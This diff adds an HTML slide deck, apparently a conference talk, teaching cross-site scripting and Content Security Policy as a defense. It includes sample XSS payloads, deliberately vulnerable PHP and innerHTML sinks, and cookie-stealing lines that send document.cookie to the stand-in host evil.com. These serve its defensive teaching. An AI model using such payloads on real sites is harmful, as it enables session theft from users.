@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Google IO 2012</title>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <!--<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">-->
+  <!--<meta name="viewport" content="width=device-width, initial-scale=1.0">-->
+  <!--This one seems to work all the time, but really small on ipad-->
+  <!--<meta name="viewport" content="initial-scale=0.4">-->
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <link rel="stylesheet" media="all" href="theme/css/default.css">
+  <link rel="stylesheet" media="only screen and (max-device-width: 480px)" href="theme/css/phone.css">
+  <base target="_blank"> <!-- This amazingness opens all links in a new tab. -->
+  <script data-main="js/slides" src="js/require-1.0.8.min.js"></script>
+</head>
+<body style="opacity: 0">
+
+<slides class="layout-widescreen">
+
+  <slide class="title-slide segue nobackground">
+    <aside class="gdbar"><img src="images/HTML5_badge.png"></aside>
+    <!-- The content of this hgroup is replaced programmatically through the slide_config.json. -->
+    <hgroup class="auto-fadein">
+      <h1 data-config-title><!-- populated from slide_config.json --></h1>
+      <h2 data-config-subtitle><!-- populated from slide_config.json --></h2>
+      <p data-config-presenter><!-- populated from slide_config.json --></p>
+    </hgroup>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>Ben Vinegar</h2>
+    </hgroup>
+    <article>
+      <ul class="build">
+        <li>Software engineer at Disqus
+        <li>Co-author, <a href="http://manning.com/vinegar">Third-party JavaScript</a> (Manning)
+        <li>Once ate 7 McDonald's cheeseburgers in one sitting
+        <li>Implemented Content Security Policy in Disqus
+      </ul>
+    </article>
+  </slide>
+
+  <slide class="segue dark nobackground">
+    <hgroup class="auto-fadein">
+      <h2>Cross-Site Scripting (XSS)</h2>
+      <h3>This is still a problem</h3>
+    </hgroup>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>Cross-site scripting (XSS)</h2>
+    </hgroup>
+    <article>
+        <p>Vulnerability where attacker injects JavaScript code into a web document
+        <pre class="prettyprint" data-lang="php">
+&lt;?php
+$name = $_GET['name'];
+echo "Welcome $name";
+?&gt;</pre>
+      <pre data-lang="http">
+GET http://ursite.com/script.php?name=%3Cscript%3Ealert(%22pwned%22)%3C%2Fscript%3E HTTP/1.1</pre>
+      <pre class="prettyprint" data-lang="html">
+Welcome &lt;script&gt;alert(&quot;pwned&quot;)&lt;/script&gt;</pre>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>Cross-site scripting (XSS)</h2>
+    </hgroup>
+    <article>
+      <p>Client-side apps are not immune</p>
+      <pre class="prettyprint" data-lang="javascript">
+var div = document.createElement('div');
+div.innerHTML = 'Welcome' + user.name;
+document.body.appendChild(div);</pre>
+      <pre class="prettyprint" data-lang="json">
+{
+  "id": 1337,
+  "username": "some_asshole87"  
+  "name": "&lt;img src=\"\" onerror=\"alert('pwned')\"&gt;",
+}</pre>
+      <pre class="prettyprint" data-lang="html">
+Welcome &lt;img src="" onerror="alert('pwned')"&gt;</pre>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>Alert isn't scary – these are</h2>
+    </hgroup>
+    <article>
+      <p>Steal cookies</p>
+      <pre class="prettyprint" data-lang="javascript">
+new Image('http://evil.com/capture?cookies=' + document.cookie);
+</pre>
+      <p>Use local XHR</p>
+      <pre class="prettyprint" data-lang="javascript">$.get('/my/contacts', function (response) { &hellip; });</pre>
+
+      <p>Use client API</p>
+      <pre class="prettyprint" data-lang="javascript">GMAIL.deleteAll();</pre>
+    </article>
+  </slide>
+
+  <slide class="nobackground">
+    <article class="flexbox vleft">
+      <h2>Mitigation</h2>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>HTTP-only cookies</h2>
+    </hgroup>
+    <article>
+      <pre class="prettyprint" data-lang="http">
+Set-Cookie: session=29e807166458d2640 <b>HttpOnly</b></pre>
+      <ul>
+        <li>Disables client access via <code>document.cookie</code>
+        <li>Mitigates cookie theft via XSS
+        <li>Wide browser support today (IE8+)
+        <li>Still vulnerable to other client attacks
+      </ul>
+    </article>
+  </slide>
+
+
+  <slide>
+    <hgroup>
+      <h2>Input sanitization</h2>
+    </hgroup>
+    <article>
+      <p>Escape dangerous characters in untrusted strings</p>
+      <pre class="prettyprint" data-lang="javascript">
+function escapeHtml(str) {
+    return String(str)
+        .replace(/&amp;/g, &quot;&amp;amp;&quot;)
+        .replace(/&lt;/g, &quot;&amp;lt;&quot;)
+        .replace(/&gt;/g, &quot;&amp;gt;&quot;)
+        .replace(/&quot;/g, &quot;&amp;quot;&quot;)
+        .replace(/&#039;/g, &quot;&amp;#039;&quot;)
+        .replace(/\//g, &quot;&amp;#x2F;&quot;)  
+}</pre>
+      <p>Character substitutions <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#XSS_Prevention_Rules_Summary">recommended by OWASP</a></p>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>Input sanitization</h2>
+    </hgroup>
+    <article>
+      <p>Sanitizing untrusted user data on the client</p>
+      <pre class="prettyprint" data-lang="javascript">
+var div = document.createElement('div');
+div.innerHTML = 'Welcome' + <b>escapeHtml(user.name)</b>;
+document.body.appendChild(div);</pre>
+      <pre class="prettyprint" data-lang="json">
+{
+  "id": 1337,
+  "username": "some_asshole87"  
+  "name": "&lt;img src=\"\" onerror=\"alert('pwned')\"&gt;",
+}</pre>
+      <pre class="prettyprint" data-lang="html">
+Welcome &amp;lt;img src=&amp;quot;&amp;quot; onerror=&amp;quot;alert(&amp;#039;pwned&amp;#039;)&amp;quot;&amp;gt;</pre>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>Input sanitization</h2>
+    </hgroup>
+    <article>
+      <p>The good</p>
+      <ul class="build">
+        <li>If done correctly, it works
+        <li>Sanitization is baked into most templating engines, frameworks
+        <li>And usually enabled by default
+      </ul>
+
+      <p>The bad</p>
+      <ul class="build">
+        <li>Sanitization is not always turned on by default
+        <li>Still largely a manual process
+        <li>You can mess up
+        <li><strong>Everyone is still messing up</strong>
+      <ul>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>Notable XSS exploits</h2>
+    </hgroup>
+    <article>
+      <ul>
+        <li>Yahoo Mail (<a href="http://thenextweb.com/insider/2013/01/31/yahoo-mail-users-still-seeing-accounts-hacked-via-xss-exploit-amid-reports-yahoo-failed-to-fix-old-flaw/">2013</a>)
+        <li>Mega.com (<a href="http://www.cloudave.com/25435/kim-dot-coms-new-mega-site-has-xss-security-holes/">2013</a>)
+        <li>Facebook (<a href="http://blog.detectify.com/post/39209711597/how-i-got-a-3-500-usd-facebook-bug-bounty">2012</a>, <a href="http://theharmonyguy.com/oldsite/2011/04/21/recent-facebook-xss-attacks-show-increasing-sophistication/">2011</a>, <a href="http://www.acunetix.com/websitesecurity/xss-facebook/">2010</a>)
+        <li>Dropbox (<a href="http://blog.detectify.com/post/39209711597/how-i-got-a-3-500-usd-facebook-bug-bounty">2012</a>)
+        <li>Google +1 button (<a href="http://blog.mindedsecurity.com/2012/11/dom-xss-on-google-plus-one-button.html">2012</a>)
+        <li>microsoft.com (<a href="http://www.rafayhackingarticles.net/2013/03/dom-based-xss-in-microsoft.html">2013</a>)
+        <li>Yelp (<a href="http://techcrunch.com/2010/05/11/another-security-hole-found-on-yelp-facebook-data-once-again-put-at-risk/">2010</a>)
+      </ul>
+
+      <p style="margin-top:2em">These are publicized exploits. There are likely far more kept private.</p>
+    </article>
+  </slide>
+
+  <slide class="quote nobackground">
+    <article class="flexbox vleft">
+      <q>
+        It's not a matter of if you will introduce an XSS vulnerability, but when.
+      </q>
+    </article>
+  </slide>
+
+  <slide class="segue dark nobackground">
+    <hgroup class="auto-fadein">
+      <h2>Content Security Policy (CSP)</h2>
+      <h3>Light at the end of the tunnel</h3>
+    </hgroup>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>Content Security Policy (CSP)</h2>
+    </hgroup>
+    <article>
+      <ul class="build">
+        <li>New browser feature for mitigiating XSS and data-injection attacks
+        <li>1.0 W3C Candidate Recomendation (1.1 underway)
+        <li>Whitelists "safe" script hosts
+        <li><code>Content-Security-Policy</code> HTTP header
+      </ul>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>Limiting script origins with CSP</h2>
+    </hgroup>
+    <article>
+      <p>Example: restrict scripts to current origin and ajax.googleapis.com</p>
+      <pre class="prettyprint" data-lang="http">
+Content-Security-Policy: script-src 'self' ajax.googleapis.com</pre>
+      <pre class="prettyprint" data-lang="html">
+&lt;script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"&gt;&lt;/script&gt;
+&lt;script src="/js/app.js"&gt;&lt;/script&gt;
+&lt;script src="http://evil.com/pwnage.js"&gt;&lt;/script&gt;</pre>
+
+      <pre class="small" data-lang="console">
+Refused to load the script 'http://evil.com/pwnage.js' because it violates<br/>the following Content Security Policy directive: "script-src 'self' ajax.googleapis.com".</pre>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>Limiting script origins with CSP</h2>
+    </hgroup>
+    <article>
+      <p>CSP also limits inline scripts
+      <pre class="prettyprint" data-lang="http">
+Content-Security-Policy: script-src 'self' ajax.googleapis.com</pre>
+      <pre class="prettyprint" data-lang="html">
+&lt;script&gt;new Image('http://evil.com/?cookie=' + document.cookie);&lt;/script&gt;</pre>
+      <pre class="small" data-lang="console">
+Refused to execute inline script because it violates the following Content Security Policy<br>directive: "script-src 'self' ajax.googleapis.com"</pre>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>Coping without inline scripts</h2>
+    </hgroup>
+    <article>
+      <p>Inline scripts are often used for defining global config state
+      <pre class="prettyprint" data-lang="html">
+&lt;head&gt;
+  &lt;script&gt;
+  var CONFIG = {
+    version = '7330b4',
+    appRoot = '//example.com',
+    cdnRoot = '//cdn.example.com'
+  };
+  &lt;/script&gt;
+  &lt;script src="js/app.js"&gt;&lt;/script&gt;
+&lt;head&gt;</pre>
+      <p>This example will cause a CSP exception.
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>Coping without inline scripts</h2>
+    </hgroup>
+    <article>
+      <pre class="prettyprint" data-lang="html">
+&lt;script id="config" type="text/json"&gt;
+{
+  "version": "7330b4",
+  "appRoot": "//example.com",
+  "cdnRoot": "//cdn.example.com"
+}
+&lt;/script&gt;
+&lt;script src="js/app.js"&gt;&lt;/script&gt;</pre>
+      <p>In app.js &hellip;</p>
+      <pre class="prettyprint" data-lang="javascript">
+var config = document.getElementById('config');
+window.CONFIG = JSON.parse(config.textContent || config.innerHTML);</pre>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>CSP and eval</h2>
+    </hgroup>
+    <article>
+      <ul>
+        <li>These rules also disable eval
+        <li>Some JS libraries depends on eval (moment.js)
+        <li>Option: explicitly allow eval
+      </ul>
+
+      <pre class="prettyprint" data-lang="http">
+Content-Security-Policy: script-src 'self' <b>'unsafe-eval'</b> ajax.googleapis.com</pre>
+
+      <p style="margin-top:2em">Warning: eval is considered an XSS vector</p>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>More than just scripts</h2>
+    </hgroup>
+    <article>
+      <p>CSP can protect against a variety of unauthorized asset types.</p>
+      <ul class="build">
+        <li><code>img-src</code> – limit origins of images
+        <li><code>style-src</code> – stylesheets
+        <li><code>media-src</code> – audio and video
+        <li><code>frame-src</code> – iframe sources
+        <li><code>connect-src</code> – XHR, WebSockets, EventSource
+        <li><code>font-src</code> – font files
+        <li><code>object-src</code> - Flash and other plugin objects
+        <li><code>default-src</code> – all assets (including scripts)
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>Mutliple CSP arguments</h2>
+    </hgroup>
+    <article>
+      <pre class="prettyprint" data-lang="http">
+Content-Security-Policy: default-src 'self';
+ script-src 'self' 'unsafe-eval' ajax.googleapis.com google-analytics.com;
+ style-src 'self' ajax.googleapis.com;
+ connect-src 'self' https://api.myapp.com realtime.myapp.com:8080;
+ media-src 'self' youtube.com;
+ object-src 'self' youtube.com;
+ frame-src 'self' youtube.com embed.ly</pre>
+    </article>
+  </slide>
+  <slide>
+    <hgroup>
+      <h2>Browser support</h2>
+    </hgroup>
+    <article>
+      <p><code>Content-Security-Policy</code></p>
+      <ul>
+        <li>Chrome 26+
+      </ul>
+      <p style="margin-top:2em"><code>X-WebKit-CSP</code></p>
+      <ul>
+        <li>Safari 5.1+
+        <li>Chrome 14 – 25
+      </ul>
+      <p style="margin-top:2em"><code>X-Content-Security-Policy</code></p>
+      <ul>
+        <li>Firefox 4+
+        <li>Internet Explorer 10*
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>Implementations not created equal</h2>
+    </hgroup>
+    <article>
+      <p>Vendor-prefixed CSP implementations all vary
+      <ul class="build">
+        <li>Firefox CSP implementation incompatible with W3C spec
+        <li>IE10 only implements sandbox directive
+        <li>Safari 5.1's CSP implementation differs from Safari 6's
+        <li>Android browser recognizes <code>X-WebKit-CSP</code>, but breaks on it
+        <li>Suggestion: avoid unprefixed implementations
+      </ul>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>Why bother with CSP today?</h2>
+    </hgroup>
+
+    <article>
+      <ul>
+        <li>Limited browser support – can't depend on CSP to protect your app</p>
+        <li>But implementing CSP still has tremendous value &hellip;
+      </ul>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>CSP reporting</h2>
+    </hgroup>
+    <article>
+      <ul class="build">
+        <li>Congure a <code>report-uri</code> to accept CSP exception requests (POST)
+        <li>Be notified of XSS vulnerabilities as they occur
+        <li>Users with CSP-supported browsers make it safer for everybody
+      </ul>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>CSP reporting</h2>
+    </hgroup>
+    <article>
+      <p>Configure an endpoint to report violations
+      <pre class="prettyprint" data-lang="http">
+Content-Security-Policy: default-src 'self'; <b>report-uri http://mysite.com/report.php</b></pre>
+
+      <p style="margin-top:2em">CSP reports are delivered as JSON via HTTP POST
+      <pre class="prettyprint" data-lang="json">
+{
+  "csp-report": {
+    "document-uri": "http://example.org/page.html",
+    "referrer": "http://evil.example.com/",
+    "blocked-uri": "http://evil.example.com/evil.js",
+    "violated-directive": "default-src 'self'",
+    "original-policy": "default 'self'; report-uri http://mysite.com/report.php"
+  }
+}</pre>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>Report-only headers</h2>
+    </hgroup>
+    <article>
+      <ul>
+        <li><code>Content-Security-Policy-Report-Only</code></li>
+        <li>Notifies you of violations, but won't take action</li>
+        <li>Lets you try CSP risk-free</li>
+      </ul>
+      <pre class="prettyprint" data-lang="http">
+<b>Content-Security-Policy-Report-Only</b>: default-src 'self'; report-uri http://mysite.com/report.php</pre>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>CSP violation events (1.1)</h2>
+    </hgroup>
+    <article>
+      <pre class="prettyprint" data-lang="javascript">
+document.onsecuritypolicyviolation = function (evt) {
+  console.log('Bzzp! Security violation on', evt.documentURI);
+  console.log('Violated directive:', evt.violatedDirective);
+  console.log('Original policy:', evt.originalPolicy);
+};</pre>
+      <ul style="margin-top:2em">
+        <li>Chrome Canary (28) w/ Experimental WebKit features flag enabled
+        <li>Warning: specification is changing
+      </ul>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>CSP report logging services</h2>
+    </hgroup>
+    <article>
+      <p>&hellip; don't exist yet</p>
+      <ul class="build">
+        <li>Sentry <a href="https://github.com/getsentry/sentry/issues/729">open issue</a>
+        <li>Errorception, Airbrake – nothing happening
+        <li>Contact your exception logging service provider today!
+        <li>Violation events open door to JS exception logging
+      </ul>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>CSP resources</h2>
+    </hgroup>
+    <article>
+      <ul>
+        <li><a href="http://www.html5rocks.com/en/tutorials/security/content-security-policy/">An Introduction to Content Security Policy</a> – HTML5Rocks
+        <li><a href="http://www.w3.org/TR/CSP/">Content Security Policy 1.0</a> – W3C
+        <li><a href="http://www.w3.org/TR/CSP/">Content Security Policy 1.1</a> – W3C
+      </ul>
+
+      <p style="margin-top:2em">Spec authors on Twitter</p>
+      <ul>
+        <li>Adam Barth (<a href="https://twitter.com/adambarth">@adambarth</a>), Google
+        <li>Dan Veditz (<a href="https://twitter.com/dveditz">@dveditz</a>), Mozilla
+        <li>Mike West (<a href="https://twitter.com/mikewest">@mikewest</a>), Google
+      </ul>
+    </article>
+  </slide>
+
+  <slide class="thank-you-slide segue nobackground">
+    <aside class="gdbar right"><img src="images/HTML5_badge.png"></aside>
+    <article class="flexbox vleft auto-fadein">
+      <h2>Thanks</h2>
+      <!-- <p>Important contact information goes here.</p> -->
+    </article>
+    <p class="auto-fadein" data-config-contact>
+      <!-- populated from slide_config.json -->
+    </p>
+  </slide>
+
+  <slide class="backdrop"></slide>
+
+</slides>
+
+<!--[if IE]>
+  <script src="http://ajax.googleapis.com/ajax/libs/chrome-frame/1/CFInstall.min.js"></script>
+  <script>CFInstall.check({mode: 'overlay'});</script>
+<![endif]-->
+</body>
+</html>
